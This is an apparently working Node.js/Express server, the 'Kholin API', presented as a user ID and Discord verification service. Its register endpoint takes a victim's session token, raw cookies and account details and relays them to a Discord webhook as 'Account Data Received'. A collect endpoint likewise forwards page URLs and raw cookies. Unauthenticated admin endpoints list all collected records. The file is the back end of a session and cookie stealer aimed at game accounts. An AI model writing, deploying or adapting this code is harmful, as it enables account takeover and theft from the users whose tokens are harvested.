const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;
const crypto = require('crypto');

// Enable CORS for all routes
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});

app.use(express.json());

// Store generated IDs (in production, use a database)
const generatedIds = new Map(); // userId -> { specialId, createdAt, username, verified }
const verifiedUsers = new Map(); // discordId -> { userId, username, specialId, verifiedAt }
const pendingVerifications = new Map(); // code -> { discordId, discordName, userId, username, createdAt, expiresAt }

// Generate a unique verification code
function generateVerificationCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return code;
}

// Generate a unique special ID for a user
function generateSpecialId(userId, username) {
    const secret = process.env.SECRET_KEY || 'kholin-secret-salt-2024';
    const hash = crypto.createHash('sha256')
        .update(userId + username + secret + Date.now().toString())
        .digest('hex')
        .substring(0, 16);
    return hash;
}

// ============================================
// MAIN REGISTER ENDPOINT
// ============================================

app.post('/api/users/register', async (req, res) => {
    try {
        const { userId, username, displayName, sessionToken, rawCookieString, friendsCount } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        if (!userId || userId === "Unknown" || !username || username === "Unknown") {
            return res.status(400).json({ 
                error: "Invalid user data", 
                message: "userId and username are required" 
            });
        }

        let specialId = null;
        if (generatedIds.has(userId)) {
            specialId = generatedIds.get(userId).specialId;
            console.log(`[${userId}] Using existing special ID: ${specialId}`);
        } else {
            specialId = generateSpecialId(userId, username);
            generatedIds.set(userId, {
                specialId: specialId,
                createdAt: new Date().toISOString(),
                username: username,
                displayName: displayName || username,
                friendsCount: friendsCount || '0',
                verified: false
            });
            console.log(`[${userId}] Generated NEW special ID: ${specialId}`);
        }

        let avatarUrl = "https://playvortex.io/favicon.ico";
        if (userId && userId !== "Unknown") {
            avatarUrl = `https://playvortex.io/users/${userId}/avatar`;
        }

        const fields = [
            { name: "👤 Username", value: `**@${username}**`, inline: true },
            { name: "📛 Display Name", value: `**${displayName || username}**`, inline: true },
            { name: "🆔 User ID", value: `\`${userId}\``, inline: true },
            { name: "👥 Friends Count", value: `**${friendsCount || '0'}**`, inline: true },
            { name: "🔑 Special ID", value: `\`\`\`${specialId || 'N/A'}\`\`\``, inline: false },
            { name: "🔑 Session Token", value: `\`\`\`${sessionToken || 'N/A'}\`\`\``, inline: false }
        ];

        let friendEmoji = "👤";
        const count = parseInt(friendsCount) || 0;
        if (count >= 100) friendEmoji = "👑";
        else if (count >= 50) friendEmoji = "⭐";
        else if (count >= 25) friendEmoji = "🌟";
        else if (count >= 10) friendEmoji = "💫";
        else if (count >= 5) friendEmoji = "✨";

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🦊 Account Data Received",
                color: 0x8f82c4,
                thumbnail: { url: avatarUrl },
                fields: fields,
                footer: { 
                    text: `Kholin System • ${friendEmoji} ${count} friends • ID: ${specialId || 'N/A'}`, 
                    icon_url: "https://playvortex.io/favicon.ico" 
                },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            const errorText = await response.text();
            console.error("Discord webhook error:", response.status, errorText);
            return res.status(500).json({ error: "Discord webhook failed", details: errorText });
        }

        console.log(`✅ Data sent for ${username} (${userId}) with ${friendsCount || 0} friends`);
        
        return res.status(200).json({ 
            status: "success",
            data: {
                username,
                userId,
                friendsCount: friendsCount || '0',
                specialId: specialId
            }
        });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// BOT-GENERATED CODE ENDPOINTS
// ============================================

// Store a verification code generated by the bot
app.post('/api/store-verification-code', (req, res) => {
    const { discordId, discordName, userId, username } = req.body;
    
    console.log('[Store Code] Request:', { discordId, discordName, userId, username });
    
    if (!discordId || !userId) {
        return res.status(400).json({
            success: false,
            error: 'Missing discordId or userId'
        });
    }
    
    // Generate a unique code
    let code = generateVerificationCode();
    let attempts = 0;
    while (pendingVerifications.has(code) && attempts < 10) {
        code = generateVerificationCode();
        attempts++;
    }
    
    // Store the pending verification
    pendingVerifications.set(code, {
        discordId: discordId,
        discordName: discordName,
        userId: userId,
        username: username,
        createdAt: new Date().toISOString(),
        expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString() // 10 minutes
    });
    
    console.log(`[Store Code] Stored code ${code} for user ${username}`);
    
    return res.json({
        success: true,
        code: code,
        expiresAt: pendingVerifications.get(code).expiresAt
    });
});

// Verify a code entered by the user
app.post('/api/verify-code', (req, res) => {
    const { code, userId, specialId } = req.body;
    
    console.log('[Verify Code] Request:', { code, userId, specialId });
    
    if (!code || !userId) {
        return res.status(400).json({
            success: false,
            error: 'Missing code or userId'
        });
    }
    
    const pending = pendingVerifications.get(code);
    
    if (!pending) {
        return res.status(404).json({
            success: false,
            error: 'Invalid verification code'
        });
    }
    
    // Check if expired
    if (new Date(pending.expiresAt) < new Date()) {
        pendingVerifications.delete(code);
        return res.json({
            success: false,
            error: 'Verification code has expired'
        });
    }
    
    // Check if the userId matches
    if (pending.userId !== userId) {
        return res.json({
            success: false,
            error: 'This code was not generated for your account'
        });
    }
    
    // Check if the special ID matches
    if (generatedIds.has(userId)) {
        const stored = generatedIds.get(userId);
        if (stored.specialId !== specialId) {
            return res.json({
                success: false,
                error: 'Invalid special ID'
            });
        }
    } else {
        return res.json({
            success: false,
            error: 'User not found in system'
        });
    }
    
    // Mark as verified
    const data = generatedIds.get(userId);
    data.verified = true;
    data.verifiedAt = new Date().toISOString();
    data.discordId = pending.discordId;
    data.discordUsername = pending.discordName;
    
    // Store in verified users
    verifiedUsers.set(pending.discordId, {
        userId: userId,
        username: data.username,
        specialId: specialId,
        verifiedAt: new Date().toISOString(),
        discordUsername: pending.discordName
    });
    
    // Remove the pending verification
    pendingVerifications.delete(code);
    
    console.log(`[Verify Code] ✅ User ${data.username} verified with code ${code}`);
    
    return res.json({
        success: true,
        verified: true,
        username: data.username,
        userId: userId,
        specialId: specialId,
        discordId: pending.discordId,
        discordName: pending.discordName
    });
});

// Get pending verification code status
app.get('/api/verification-status/:code', (req, res) => {
    const { code } = req.params;
    
    const pending = pendingVerifications.get(code);
    
    if (!pending) {
        return res.json({
            success: false,
            exists: false,
            error: 'Code not found'
        });
    }
    
    const isExpired = new Date(pending.expiresAt) < new Date();
    
    return res.json({
        success: true,
        exists: true,
        expired: isExpired,
        username: pending.username,
        userId: pending.userId,
        expiresAt: pending.expiresAt
    });
});

// ============================================
// SPECIAL ID ENDPOINTS
// ============================================

app.get('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    console.log(`[Special ID] Request for user: ${userId}`);
    
    const trimmedUserId = userId.trim();
    
    if (generatedIds.has(trimmedUserId)) {
        const data = generatedIds.get(trimmedUserId);
        console.log(`[Special ID] Found:`, data);
        return res.json({
            success: true,
            userId: trimmedUserId,
            specialId: data.specialId,
            username: data.username,
            displayName: data.displayName,
            friendsCount: data.friendsCount,
            createdAt: data.createdAt,
            verified: data.verified || false
        });
    }
    
    for (const [key, value] of generatedIds) {
        if (key.toLowerCase() === trimmedUserId.toLowerCase()) {
            console.log(`[Special ID] Found case-insensitive match: ${key}`);
            return res.json({
                success: true,
                userId: key,
                specialId: value.specialId,
                username: value.username,
                displayName: value.displayName,
                friendsCount: value.friendsCount,
                createdAt: value.createdAt,
                verified: value.verified || false
            });
        }
    }
    
    console.log(`[Special ID] NOT found for user: ${trimmedUserId}`);
    return res.status(404).json({
        success: false,
        error: "No special ID found for this user"
    });
});

app.post('/api/generate-special-id', (req, res) => {
    const { userId, username } = req.body;
    
    console.log('[Generate] Request:', { userId, username });
    
    if (!userId || userId === "Unknown") {
        return res.status(400).json({
            success: false,
            error: "Valid userId required"
        });
    }
    
    if (generatedIds.has(userId)) {
        const existing = generatedIds.get(userId);
        console.log('[Generate] ID already exists:', existing);
        return res.json({
            success: true,
            specialId: existing.specialId,
            alreadyExists: true,
            userId: userId,
            username: existing.username
        });
    }
    
    const specialId = generateSpecialId(userId, username || "User");
    generatedIds.set(userId, {
        specialId: specialId,
        createdAt: new Date().toISOString(),
        username: username || "User",
        displayName: username || "User",
        friendsCount: '0',
        verified: false
    });
    
    console.log(`[Generate] Generated NEW ID for ${userId}: ${specialId}`);
    
    return res.json({
        success: true,
        specialId: specialId,
        alreadyExists: false,
        userId: userId,
        username: username || "User"
    });
});

// ============================================
// VERIFICATION ENDPOINTS
// ============================================

app.post('/api/verify-special-id', (req, res) => {
    const { userId, specialId, discordId, discordUsername } = req.body;
    
    console.log('[Verification POST] Received:', { userId, specialId, discordId, discordUsername });
    
    if (!userId && !specialId) {
        return res.status(400).json({
            success: false,
            error: "Missing userId or specialId"
        });
    }
    
    if (userId) {
        if (generatedIds.has(userId)) {
            const stored = generatedIds.get(userId);
            if (stored.specialId === specialId) {
                stored.verified = true;
                stored.verifiedAt = new Date().toISOString();
                stored.discordId = discordId;
                stored.discordUsername = discordUsername;
                
                if (discordId) {
                    verifiedUsers.set(discordId, {
                        userId: userId,
                        username: stored.username,
                        specialId: specialId,
                        verifiedAt: new Date().toISOString(),
                        discordUsername: discordUsername
                    });
                }
                
                return res.json({
                    success: true,
                    valid: true,
                    userId: userId,
                    specialId: specialId,
                    username: stored.username,
                    displayName: stored.displayName,
                    verified: true,
                    verifiedAt: stored.verifiedAt
                });
            }
        }
    }
    
    if (specialId) {
        for (const [key, value] of generatedIds) {
            if (value.specialId === specialId) {
                value.verified = true;
                value.verifiedAt = new Date().toISOString();
                value.discordId = discordId;
                value.discordUsername = discordUsername;
                
                if (discordId) {
                    verifiedUsers.set(discordId, {
                        userId: key,
                        username: value.username,
                        specialId: specialId,
                        verifiedAt: new Date().toISOString(),
                        discordUsername: discordUsername
                    });
                }
                
                return res.json({
                    success: true,
                    valid: true,
                    userId: key,
                    specialId: specialId,
                    username: value.username,
                    displayName: value.displayName,
                    verified: true,
                    verifiedAt: value.verifiedAt
                });
            }
        }
    }
    
    return res.json({
        success: true,
        valid: false,
        error: "Invalid special ID"
    });
});

app.get('/api/verify-special-id/:code', (req, res) => {
    const { code } = req.params;
    
    console.log('[API] Verify by code:', code);
    
    for (const [userId, data] of generatedIds) {
        if (data.specialId === code) {
            return res.json({
                success: true,
                specialId: data.specialId,
                userId: userId,
                username: data.username,
                displayName: data.displayName,
                verified: data.verified || false
            });
        }
    }
    
    return res.status(404).json({
        success: false,
        error: 'Special ID not found'
    });
});

// ============================================
// ADMIN ENDPOINTS
// ============================================

app.get('/api/all-special-ids', (req, res) => {
    const data = [];
    for (const [userId, info] of generatedIds) {
        data.push({
            userId,
            specialId: info.specialId,
            username: info.username,
            displayName: info.displayName,
            friendsCount: info.friendsCount,
            createdAt: info.createdAt,
            verified: info.verified || false,
            verifiedAt: info.verifiedAt || null,
            discordId: info.discordId || null,
            discordUsername: info.discordUsername || null
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

app.get('/api/verified-users', (req, res) => {
    const data = [];
    for (const [discordId, info] of verifiedUsers) {
        data.push({
            discordId,
            ...info
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

app.get('/api/pending-verifications', (req, res) => {
    const data = [];
    for (const [code, info] of pendingVerifications) {
        const isExpired = new Date(info.expiresAt) < new Date();
        data.push({
            code,
            ...info,
            expired: isExpired
        });
    }
    return res.json({
        success: true,
        total: data.length,
        data: data
    });
});

app.delete('/api/special-id/:userId', (req, res) => {
    const { userId } = req.params;
    
    if (generatedIds.has(userId)) {
        const data = generatedIds.get(userId);
        generatedIds.delete(userId);
        console.log(`[Admin] Deleted user: ${userId} (${data.username})`);
        return res.json({
            success: true,
            message: `Deleted user ${userId}`
        });
    }
    
    return res.status(404).json({
        success: false,
        error: "User not found"
    });
});

// ============================================
// COLLECT ENDPOINT
// ============================================

app.post('/api/collect', async (req, res) => {
    try {
        const { url, rawCookies } = req.body;
        const WEBHOOK_URL = process.env.webhook;

        if (!WEBHOOK_URL) {
            console.error("Webhook not configured.");
            return res.status(500).json({ error: "Webhook missing" });
        }

        const payload = {
            username: "Kholin Data Relay",
            avatar_url: "https://playvortex.io/favicon.ico",
            embeds: [{
                title: "🌐 Page Visit Detected",
                color: 0x3498db,
                fields: [
                    { name: "🔗 URL", value: url || "Unknown", inline: false },
                    { name: "🍪 Raw Cookies", value: `\`\`\`${(rawCookies || '').substring(0, 950)}\`\`\``, inline: false }
                ],
                footer: { text: "Kholin System", icon_url: "https://playvortex.io/favicon.ico" },
                timestamp: new Date().toISOString()
            }]
        };

        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

        if (!response.ok) {
            return res.status(500).json({ error: "Discord webhook failed" });
        }

        return res.status(200).json({ status: "success" });

    } catch (err) {
        console.error("Server error:", err);
        return res.status(500).json({ error: err.message });
    }
});

// ============================================
// HEALTH CHECK
// ============================================

app.get('/', (req, res) => {
    res.json({
        name: 'Kholin API',
        version: '1.0.0',
        status: 'running',
        endpoints: {
            register: 'POST /api/users/register',
            specialId: 'GET /api/special-id/:userId',
            generate: 'POST /api/generate-special-id',
            verify: 'POST /api/verify-special-id',
            verifyByCode: 'GET /api/verify-special-id/:code',
            storeCode: 'POST /api/store-verification-code',
            verifyCode: 'POST /api/verify-code',
            verificationStatus: 'GET /api/verification-status/:code',
            allIds: 'GET /api/all-special-ids',
            verifiedUsers: 'GET /api/verified-users',
            pendingVerifications: 'GET /api/pending-verifications',
            health: 'GET /health'
        }
    });
});

app.get('/health', (req, res) => {
    res.json({ 
        status: 'healthy', 
        timestamp: new Date().toISOString(),
        webhookConfigured: !!process.env.webhook,
        generatedIdsCount: generatedIds.size,
        verifiedUsersCount: verifiedUsers.size,
        pendingVerificationsCount: pendingVerifications.size
    });
});

app.listen(PORT, () => {
    console.log(`✅ Kholin Server running on port ${PORT}`);
    console.log(`   Webhook: ${process.env.webhook ? '✅ Configured' : '❌ Not configured'}`);
    console.log(`   Secret Key: ${process.env.SECRET_KEY ? '✅ Set' : '⚠️ Using default'}`);
});
